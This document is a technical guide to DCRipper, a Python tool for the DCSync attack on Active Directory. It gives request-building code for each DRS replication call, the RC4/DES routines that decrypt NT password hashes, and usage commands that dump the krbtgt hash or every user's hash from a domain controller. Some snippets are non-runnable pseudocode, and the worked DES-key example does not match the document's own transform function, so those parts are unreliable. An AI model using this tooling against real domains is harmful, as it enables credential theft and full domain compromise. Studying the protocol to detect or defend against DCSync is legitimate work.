# DCRipper: DCSync Implementation Guide

A complete, step-by-step explanation of how DCRipper implements the DCSync attack without using Impacket.

## Table of Contents

1. [Overview](#overview)
2. [Protocol Stack](#protocol-stack)
3. [Step-by-Step Flow](#step-by-step-flow)
4. [Detailed Implementation](#detailed-implementation)
5. [Cryptographic Operations](#cryptographic-operations)
6. [Key Differences from Impacket](#key-differences-from-impacket)

---

## Overview

DCSync is an attack that abuses the Directory Replication Service (DRS) protocol to extract password hashes from a Domain Controller. It requires the following privileges:
- **Replicating Directory Changes**
- **Replicating Directory Changes All**

The attack mimics a Domain Controller requesting replication data from another DC.

### What I Built

```
┌─────────────────────────────────────────────────────────────────┐
│                        DCRipper                                  │
├─────────────────────────────────────────────────────────────────┤
│  Application Layer                                               │
│  ├── dcripper.py          (CLI interface)                       │
│  └── drsr/client.py       (DRS client orchestration)            │
├─────────────────────────────────────────────────────────────────┤
│  DRS Protocol Layer                                              │
│  ├── drsr/bind.py         (DRSBind - establish DRS session)     │
│  ├── drsr/cracknames.py   (DRSCrackNames - name resolution)     │
│  ├── drsr/dcinfo.py       (DRSDomainControllerInfo)             │
│  ├── drsr/getncchanges.py (DRSGetNCChanges - replication)       │
│  └── drsr/structures.py   (DSNAME, ATTR structures)             │
├─────────────────────────────────────────────────────────────────┤
│  RPC Layer                                                       │
│  ├── rpc/dcerpc.py        (DCE/RPC client)                      │
│  ├── rpc/ndr.py           (NDR serialization)                   │
│  └── rpc/epm.py           (Endpoint Mapper)                     │
├─────────────────────────────────────────────────────────────────┤
│  Transport & Auth Layer                                          │
│  ├── transport/tcp.py     (TCP transport)                       │
│  ├── transport/ntlm.py    (NTLM authentication)                 │
│  └── transport/smb.py     (SMB named pipe transport)            │
├─────────────────────────────────────────────────────────────────┤
│  Crypto Layer                                                    │
│  └── drsr/crypto.py       (RC4 + DES decryption)                │
└─────────────────────────────────────────────────────────────────┘
```

---

## Protocol Stack

DCSync uses the following protocol stack:

```
┌────────────────────────────┐
│    MS-DRSR (DRS Protocol)  │  ← Replication protocol
├────────────────────────────┤
│    DCE/RPC                 │  ← Remote procedure calls
├────────────────────────────┤
│    NTLM Authentication     │  ← Authentication
├────────────────────────────┤
│    TCP (port 135 + dynamic)│  ← Transport
└────────────────────────────┘
```

### Key UUIDs

| Interface | UUID | Purpose |
|-----------|------|---------|
| Endpoint Mapper | `e1af8308-5d1f-11c9-91a4-08002b14a0fa` | Find dynamic RPC port |
| DRSUAPI | `e3514235-4b06-11d1-ab04-00c04fc2dcd2` | DRS replication |
| NDR Transfer Syntax | `8a885d04-1ceb-11c9-9fe8-08002b104860` | Data encoding |

---

## Step-by-Step Flow

### Phase 1: Connection Setup

```
┌─────────┐                              ┌────────────┐
│ DCRipper│                              │     DC     │
└────┬────┘                              └─────┬──────┘
     │                                         │
     │ 1. TCP Connect to port 135              │
     ├────────────────────────────────────────>│
     │                                         │
     │ 2. RPC Bind to Endpoint Mapper          │
     ├────────────────────────────────────────>│
     │                                         │
     │ 3. EPM Map (find DRSUAPI port)          │
     ├────────────────────────────────────────>│
     │         4. Returns dynamic port         │
     │<────────────────────────────────────────┤
     │                                         │
     │ 5. TCP Connect to dynamic port          │
     ├────────────────────────────────────────>│
     │                                         │
     │ 6. RPC Bind with NTLM Auth              │
     ├────────────────────────────────────────>│
     │      (3-leg NTLM handshake)             │
     │<───────────────────────────────────────>│
     │                                         │
```

**Files involved:**
- `rpc/epm.py` - Endpoint Mapper client
- `rpc/dcerpc.py` - DCE/RPC implementation
- `transport/tcp.py` - TCP transport
- `transport/ntlm.py` - NTLM authentication

### Phase 2: DRS Session Establishment

```
     │ 7. DRSBind                              │
     ├────────────────────────────────────────>│
     │         8. DRS Handle returned          │
     │<────────────────────────────────────────┤
     │                                         │
     │ 9. DRSDomainControllerInfo              │
     ├────────────────────────────────────────>│
     │      10. NtdsDsaObjectGuid returned     │
     │<────────────────────────────────────────┤
     │                                         │
     │ 11. DRSCrackNames (resolve domain DN)   │
     ├────────────────────────────────────────>│
     │         12. Domain DN returned          │
     │<────────────────────────────────────────┤
```

**Files involved:**
- `drsr/bind.py` - DRSBind operation
- `drsr/dcinfo.py` - DRSDomainControllerInfo
- `drsr/cracknames.py` - DRSCrackNames

### Phase 3: Secret Replication

```
     │ 13. DRSCrackNames (resolve user GUID)   │
     ├────────────────────────────────────────>│
     │         14. User GUID returned          │
     │<────────────────────────────────────────┤
     │                                         │
     │ 15. DRSGetNCChanges (EXOP_REPL_OBJ)     │
     ├────────────────────────────────────────>│
     │      16. Encrypted secrets returned     │
     │<────────────────────────────────────────┤
     │                                         │
     │ 17. Decrypt secrets (RC4 + DES)         │
     │     (local operation)                   │
```

**Files involved:**
- `drsr/cracknames.py` - Resolve username to GUID
- `drsr/getncchanges.py` - Request replication
- `drsr/crypto.py` - Decrypt secrets

---

## Detailed Implementation

### 1. Endpoint Mapping (`rpc/epm.py`)

The Endpoint Mapper tells us which dynamic port the DRSUAPI service is listening on.

```python
# Building an EPM tower (protocol stack descriptor)
def _build_tower(self, interface_uuid: bytes, version: Tuple[int, int]) -> bytes:
    floors = []

    # Floor 1: Interface UUID (DRSUAPI)
    floor1 = build_uuid_floor(interface_uuid, version)

    # Floor 2: NDR Transfer Syntax
    floor2 = build_uuid_floor(NDR_UUID, (2, 0))

    # Floor 3: RPC connection-oriented
    floor3 = protocol_id=0x0b  # ncacn (connection-oriented)

    # Floor 4: TCP
    floor4 = protocol_id=0x07  # TCP, port=0 (we want the server's port)

    # Floor 5: IP
    floor5 = protocol_id=0x09  # IP address

    return combine_floors(floors)
```

**Response parsing:** Extract the TCP port from floor 4's right-hand side (RHS) data.

### 2. DCE/RPC with NTLM (`rpc/dcerpc.py`, `transport/ntlm.py`)

#### RPC Packet Structure

```
┌────────────────────────────────────────┐
│ Common Header (24 bytes)               │
│ ├── version (1 byte) = 5               │
│ ├── version_minor (1 byte) = 0         │
│ ├── packet_type (1 byte)               │
│ ├── flags (1 byte)                     │
│ ├── data_representation (4 bytes)      │
│ ├── frag_length (2 bytes)              │
│ ├── auth_length (2 bytes)              │
│ └── call_id (4 bytes)                  │
├────────────────────────────────────────┤
│ Stub Data (variable)                   │
├────────────────────────────────────────┤
│ Auth Verifier (if authenticated)       │
│ ├── auth_type (1 byte) = 0x0a (NTLM)   │
│ ├── auth_level (1 byte) = 0x06 (PKT_PRIVACY) │
│ ├── auth_pad_length (1 byte)           │
│ ├── auth_context_id (4 bytes)          │
│ └── auth_value (variable - NTLM token) │
└────────────────────────────────────────┘
```

#### NTLM Authentication Flow

```python
# Step 1: Generate NEGOTIATE message
negotiate = build_ntlm_negotiate(domain, workstation)

# Step 2: Send in RPC bind request (auth_type=0x0a)
bind_request = build_rpc_bind(DRSUAPI_UUID, negotiate)
bind_response = transport.send(bind_request)

# Step 3: Parse CHALLENGE from response
challenge = parse_ntlm_challenge(bind_response.auth_value)
server_challenge = challenge.server_challenge  # 8 bytes

# Step 4: Compute NTLM response
nt_hash = MD4(password.encode('utf-16-le'))
session_base_key = HMAC_MD5(nt_hash, username.upper() + domain.upper())
client_challenge = random_bytes(8)
temp = server_challenge + client_challenge + ...
nt_proof = HMAC_MD5(session_base_key, temp)

# Step 5: Derive session key for encryption
session_key = HMAC_MD5(session_base_key, nt_proof)

# Step 6: Send AUTH3 with AUTHENTICATE message
auth3 = build_rpc_auth3(authenticate_message)
```

#### Encryption (PKT_PRIVACY)

For each RPC request after authentication:

```python
# Encrypt stub data with RC4
sealing_key = MD5(session_key + "session key to client-to-server sealing key magic constant")
rc4 = RC4(sealing_key)
encrypted_stub = rc4.encrypt(stub_data)

# Generate signature
signing_key = MD5(session_key + "session key to client-to-server signing key magic constant")
signature = HMAC_MD5(signing_key, sequence_number + stub_data)
```

**File:** `transport/ntlm.py` - Lines 100-200

### 3. NDR Serialization (`rpc/ndr.py`)

NDR (Network Data Representation) is how data is encoded on the wire.

#### Key Rules

1. **Little-endian** byte order
2. **Alignment**: Types aligned to their natural boundary
   - DWORD (4 bytes) → 4-byte aligned
   - LONGLONG (8 bytes) → 8-byte aligned
3. **Pointers**: Written as referent IDs, data deferred to end
4. **Conformant arrays**: `max_count` prefix before data
5. **Conformant varying arrays**: `max_count`, `offset`, `actual_count` prefix

```python
class NDRSerializer:
    def pack_uint32(self, value):
        self.data += struct.pack("<I", value)

    def pack_pointer(self, is_null=False):
        if is_null:
            self.data += b"\x00\x00\x00\x00"
        else:
            self.referent_id += 1
            self.data += struct.pack("<I", self.referent_id)

    def align(self, boundary, pad_byte=0x00):
        remainder = len(self.data) % boundary
        if remainder:
            self.data += bytes([pad_byte] * (boundary - remainder))
```

### 4. DRSBind (`drsr/bind.py`)

Establishes a DRS session and returns a context handle.

```python
def bind(self) -> Tuple[bytes, int]:
    ndr = NDRSerializer()

    # puuidClientDsa (GUID) - our fake DSA GUID
    ndr.pack_guid(b"\x11" * 16)

    # pextClient (DRS_EXTENSIONS_INT)
    extensions = DRS_EXTENSIONS()
    extensions.dwFlags = DRS_EXT_GETCHGREPLY_V6  # Request V6 response
    ndr.pack_pointer(True)  # Non-null
    ndr.pack_bytes(extensions.to_bytes())

    response = self.rpc.call(DRSUAPI_DRS_BIND, ndr.get_data())

    # Parse response
    # - phDrs: 20-byte context handle
    # - ppextServer: server capabilities
    handle = response[0:20]
    return handle, server_extensions
```

**Opnum:** 0 (DRSUAPI_DRS_BIND)

### 5. DRSCrackNames (`drsr/cracknames.py`)

Resolves names between different formats (e.g., NT4 account → distinguished name).

```python
def crack_names(self, names: List[str], format_offered: int, format_desired: int):
    ndr = NDRSerializer()

    # hDrs (context handle)
    ndr.pack_bytes(self.drs_handle)

    # dwInVersion = 1
    ndr.pack_uint32(1)

    # DRS_MSG_CRACKREQ_V1
    ndr.pack_uint32(0)  # CodePage
    ndr.pack_uint32(0)  # LocaleId
    ndr.pack_uint32(0)  # dwFlags
    ndr.pack_uint32(format_offered)  # e.g., DS_NAME_FORMAT_NT4_ACCOUNT (2)
    ndr.pack_uint32(format_desired)  # e.g., DS_NAME_FORMAT_FQDN_1779 (1)
    ndr.pack_uint32(len(names))  # cNames
    ndr.pack_pointer(True)  # rpNames pointer

    # rpNames array (conformant)
    ndr.pack_uint32(len(names))  # max_count
    for name in names:
        ndr.pack_unicode_string(name)

    response = self.rpc.call(DRSUAPI_DRS_CRACK_NAMES, ndr.get_data())
    return parse_crack_names_response(response)
```

**Opnum:** 12 (DRSUAPI_DRS_CRACK_NAMES)

**Name Formats:**
| Value | Format | Example |
|-------|--------|---------|
| 1 | DS_NAME_FORMAT_FQDN_1779 | `CN=Administrator,CN=Users,DC=lab,DC=local` |
| 2 | DS_NAME_FORMAT_NT4_ACCOUNT | `LAB\Administrator` |
| 6 | DS_UNIQUE_ID_NAME | `{guid}` |

### 6. DRSGetNCChanges (`drsr/getncchanges.py`)

The core operation - requests replication of an object's secrets.

#### Request Building (V8)

```python
def _build_request_v8(self, nc_dsname, target_dsname, extended_op):
    ndr = NDRSerializer()

    # hDrs (20 bytes)
    ndr.pack_bytes(self.drs_handle)

    # dwInVersion = 8
    ndr.pack_uint32(8)
    ndr.pack_uint32(8)  # union discriminator

    ndr.align(8)

    # DRS_MSG_GETCHGREQ_V8
    # uuidDsaObjDest - our NtdsDsaObjectGuid
    ndr.pack_guid_raw(self.ntds_dsa_guid)

    # uuidInvocIdSrc - same GUID
    ndr.pack_guid_raw(self.ntds_dsa_guid)

    # pNC pointer (deferred)
    ndr.pack_pointer(True)

    ndr.align(8)

    # usnvecFrom (USN_VECTOR - 24 bytes)
    ndr.pack_uint64(0)  # usnHighObjUpdate
    ndr.pack_uint64(0)  # usnReserved
    ndr.pack_uint64(0)  # usnHighPropUpdate

    # pUpToDateVecDest (NULL)
    ndr.pack_pointer(False)

    # ulFlags
    flags = DRS_INIT_SYNC | DRS_WRIT_REP
    ndr.pack_uint32(flags)

    # cMaxObjects, cMaxBytes
    ndr.pack_uint32(1)
    ndr.pack_uint32(0)

    # ulExtendedOp - THIS IS KEY
    ndr.pack_uint32(extended_op)  # EXOP_REPL_OBJ (6) for single object

    ndr.align(8)
    ndr.pack_uint64(0)  # liFsmoInfo

    # pPartialAttrSet, pPartialAttrSetEx (NULL)
    ndr.pack_pointer(False)
    ndr.pack_pointer(False)

    # PrefixTableDest (empty)
    ndr.pack_uint32(0)
    ndr.pack_pointer(False)

    # Deferred: pNC DSNAME (target object)
    ndr.pack_bytes(target_dsname.to_ndr())

    return ndr.get_data()
```

**Opnum:** 3 (DRSUAPI_DRS_GET_NC_CHANGES)

**Extended Operations:**
| Value | Operation | Description |
|-------|-----------|-------------|
| 0 | Normal replication | Full NC sync |
| 6 | EXOP_REPL_OBJ | Single object |
| 7 | EXOP_REPL_SECRETS | Single object with secrets |

#### Response Parsing (V6)

The response structure is complex:

```
DRS_MSG_GETCHGREPLY_V6:
├── uuidDsaObjSrc (GUID)
├── uuidInvocIdSrc (GUID)
├── pNC (DSNAME*)           ← Naming context
├── usnvecFrom (USN_VECTOR)
├── usnvecTo (USN_VECTOR)
├── pUpToDateVecSrc*
├── PrefixTableSrc          ← Schema prefix table
├── ulExtendedRet
├── cNumObjects             ← Number of objects
├── cNumBytes
├── pObjects*               ← REPLENTINFLIST (linked list)
├── fMoreData
└── ...
```

**REPLENTINFLIST structure:**
```
REPLENTINFLIST:
├── pNextEntInf*            ← Next in linked list
├── Entinf:
│   ├── pName (DSNAME*)     ← Object's DN, GUID, SID
│   ├── ulFlags
│   └── AttrBlock:
│       ├── attrCount
│       └── pAttr*          ← Array of ATTR
├── fIsNCPrefix
├── pParentGuid*
└── pMetaDataExt*
```

**ATTR structure:**
```
ATTR:
├── attrTyp (ATTRTYP)       ← Attribute ID (OID-encoded)
└── AttrVal:
    ├── valCount
    └── pAVal*              ← Array of ATTRVAL
        ├── valLen
        └── pVal*           ← Encrypted attribute data
```

#### Critical Parsing Details

**DSNAME null terminator:**
```python
# DSNAME string has a null terminator AFTER the string
name_len = ndr.unpack_uint32()
if name_len > 0:
    name_bytes = ndr.unpack_bytes(name_len * 2)  # UTF-16LE
    ndr.skip(2)  # NULL TERMINATOR - easy to miss!
```

**PREFIX_TABLE:**
```python
# Conformant array format
actual_count = ndr.unpack_uint32()  # max_count
for _ in range(actual_count):
    ndx = ndr.unpack_uint32()
    length = ndr.unpack_uint32()
    blob_ptr = ndr.unpack_pointer()
```

**Attribute ID mapping:**
The server returns OID-prefixed attribute IDs, not the raw AD attribute IDs:

| Attribute | Raw AD ID | Wire ID |
|-----------|-----------|---------|
| sAMAccountName | 0x90045 | 0x90001 |
| unicodePwd | 0x9005a | 0x9005a |
| objectSid | 0x90092 | 0x90092 |
| pwdLastSet | 0x9004a | 0x90060 |

---

## Cryptographic Operations

### Password Hash Decryption (`drsr/crypto.py`)

The encrypted `unicodePwd` attribute has two layers of encryption:

```
┌──────────────────────────────────────────────────────────┐
│                   Encrypted Data (36 bytes)               │
├──────────────────────────────────────────────────────────┤
│ Salt (16 bytes) │ RC4-encrypted: CRC32 (4) + DES(hash)   │
└──────────────────────────────────────────────────────────┘
                            │
                            ▼ RC4 Decrypt
┌──────────────────────────────────────────────────────────┐
│              After RC4 Layer (20 bytes)                   │
├──────────────────────────────────────────────────────────┤
│ CRC32 (4 bytes) │ DES-encrypted NT hash (16 bytes)        │
└──────────────────────────────────────────────────────────┘
                            │
                            ▼ DES Decrypt
┌──────────────────────────────────────────────────────────┐
│              Final NT Hash (16 bytes)                     │
└──────────────────────────────────────────────────────────┘
```

#### Layer 1: RC4 Decryption

```python
def decrypt_attribute_value(encrypted_data: bytes, session_key: bytes) -> bytes:
    # Extract salt (first 16 bytes)
    salt = encrypted_data[:16]
    ciphertext = encrypted_data[16:]

    # Derive RC4 key: MD5(session_key || salt)
    rc4_key = MD5(session_key + salt)

    # Decrypt
    cipher = ARC4.new(rc4_key)
    plaintext = cipher.decrypt(ciphertext)

    # Skip CRC32 (first 4 bytes)
    return plaintext[4:]
```

#### Layer 2: DES Decryption (RID-based)

The NT hash is encrypted with DES using keys derived from the user's RID.

```python
def remove_des_layer(encrypted_hash: bytes, rid: int) -> bytes:
    # RID as little-endian bytes: [0, 1, 2, 3]
    rid_bytes = struct.pack("<I", rid)

    # Per MS-SAMR 2.2.11.1.3:
    # Key1 input = [RID[0], RID[1], RID[2], RID[3], RID[0], RID[1], RID[2]]
    # Key2 input = [RID[3], RID[0], RID[1], RID[2], RID[3], RID[0], RID[1]]

    key1_bytes = bytes([
        rid_bytes[0], rid_bytes[1], rid_bytes[2], rid_bytes[3],
        rid_bytes[0], rid_bytes[1], rid_bytes[2]
    ])
    key2_bytes = bytes([
        rid_bytes[3], rid_bytes[0], rid_bytes[1], rid_bytes[2],
        rid_bytes[3], rid_bytes[0], rid_bytes[1]
    ])

    # Expand 7 bytes to 8-byte DES keys
    key1 = transform_key(key1_bytes)
    key2 = transform_key(key2_bytes)

    # Decrypt each half
    des1 = DES.new(key1, DES.MODE_ECB)
    des2 = DES.new(key2, DES.MODE_ECB)

    return des1.decrypt(encrypted_hash[:8]) + des2.decrypt(encrypted_hash[8:16])
```

#### DES Key Expansion

Transform 7 bytes to 8-byte DES key by spreading bits:

```python
def transform_key(input_key: bytes) -> bytes:
    # 7 bytes (56 bits) → 8 bytes (64 bits with parity)
    output = bytearray(8)

    output[0] = input_key[0] >> 1
    output[1] = ((input_key[0] & 0x01) << 6) | (input_key[1] >> 2)
    output[2] = ((input_key[1] & 0x03) << 5) | (input_key[2] >> 3)
    output[3] = ((input_key[2] & 0x07) << 4) | (input_key[3] >> 4)
    output[4] = ((input_key[3] & 0x0F) << 3) | (input_key[4] >> 5)
    output[5] = ((input_key[4] & 0x1F) << 2) | (input_key[5] >> 6)
    output[6] = ((input_key[5] & 0x3F) << 1) | (input_key[6] >> 7)
    output[7] = input_key[6] & 0x7F

    # Set parity bits (shift left, mask off LSB)
    for i in range(8):
        output[i] = (output[i] << 1) & 0xFE

    return bytes(output)
```

### Example Calculation

For RID 500 (Administrator):

```
RID = 500 = 0x000001F4
rid_bytes = [0xF4, 0x01, 0x00, 0x00]  (little-endian)

Key1 input = [0xF4, 0x01, 0x00, 0x00, 0xF4, 0x01, 0x00]
Key2 input = [0x00, 0xF4, 0x01, 0x00, 0x00, 0xF4, 0x01]

After transform_key():
Key1 = [0xF4, 0x02, 0x00, 0x00, 0xF4, 0x02, 0x00, 0x00] (expanded)
Key2 = [0x00, 0xF4, 0x02, 0x00, 0x00, 0xF4, 0x02, 0x00] (expanded)
```

---

## Key Differences from Impacket

### 1. Zero External Dependencies

| Component | Impacket | DCRipper |
|-----------|----------|----------|
| NDR | impacket.dcerpc.v5.ndr | `rpc/ndr.py` |
| DCE/RPC | impacket.dcerpc.v5.rpcrt | `rpc/dcerpc.py` |
| NTLM | impacket.ntlm | `transport/ntlm.py` |
| DRSR | impacket.dcerpc.v5.drsuapi | `drsr/*.py` |
| DES | impacket.crypto | `drsr/crypto.py` (pycryptodome) |

### 2. Simpler Structure

Impacket uses complex class hierarchies with multiple inheritance. DCRipper uses straightforward procedural code:

```python
# Impacket style
class DRSUAPI_V4(DCERPC_v5):
    def DRSBind(self, request):
        return self.request(DRSUAPI_DRS_BIND, request)

# DCRipper style
def bind(self):
    request = build_bind_request()
    return self.rpc.call(DRSUAPI_DRS_BIND, request)
```

### 3. Explicit NDR Handling

Impacket auto-generates NDR code from IDL. DCRipper manually handles each structure:

```python
# Manual NDR packing - you see exactly what's on the wire
ndr = NDRSerializer()
ndr.pack_uint32(8)           # dwInVersion
ndr.pack_uint32(8)           # union tag
ndr.align(8)                 # explicit alignment
ndr.pack_guid_raw(guid)      # 16 bytes
ndr.pack_pointer(True)       # referent ID
```

### 4. Debugging

DCRipper includes built-in debug output:

```bash
DEBUG_RPC=1 python3 dcripper.py -dc 192.168.3.200 -d LAB -u admin -p pass
```

This shows:
- Raw hex of each RPC request/response
- NTLM handshake details
- NDR parsing progress
- Decryption calculations

### 5. Bug Fixes Discovered

During implementation, I found these NDR parsing issues:

1. **DSNAME null terminator**: The string in DSNAME has a 2-byte null terminator AFTER the string that isn't included in `NameLen`

2. **Attribute ID mapping**: The server returns OID-encoded attribute IDs, not raw AD schema IDs

3. **REPLENTINFLIST structure**: Has `pParentGuid` and `pMetaDataExt` pointers that must be accounted for

---

## File Reference

| File | Purpose |
|------|---------|
| `dcripper.py` | CLI entry point |
| `config.py` | Constants and configuration |
| `drsr/client.py` | High-level DRS client |
| `drsr/bind.py` | DRSBind operation |
| `drsr/cracknames.py` | DRSCrackNames operation |
| `drsr/dcinfo.py` | DRSDomainControllerInfo |
| `drsr/getncchanges.py` | DRSGetNCChanges - the core |
| `drsr/structures.py` | DSNAME, ReplicationData |
| `drsr/crypto.py` | RC4 + DES decryption |
| `rpc/dcerpc.py` | DCE/RPC client |
| `rpc/ndr.py` | NDR serialization |
| `rpc/epm.py` | Endpoint Mapper |
| `transport/tcp.py` | TCP transport |
| `transport/ntlm.py` | NTLM authentication |
| `output/formatter.py` | Hash output formatting |
| `parser/sid.py` | SID parsing |

---

## Usage

```bash
# Single user
python3 dcripper.py -dc 192.168.3.200 -d LAB -u admin -p Password -t krbtgt

# All users
python3 dcripper.py -dc 192.168.3.200 -d LAB -u admin -p Password -a

# With debug output
DEBUG_RPC=1 python3 dcripper.py -dc 192.168.3.200 -d LAB -u admin -p Password -t administrator
```

---

## References

- [MS-DRSR] Directory Replication Service (DRS) Remote Protocol
- [MS-RPCE] Remote Procedure Call Protocol Extensions
- [MS-NLMP] NT LAN Manager (NTLM) Authentication Protocol
- [MS-SAMR] Security Account Manager (SAM) Remote Protocol
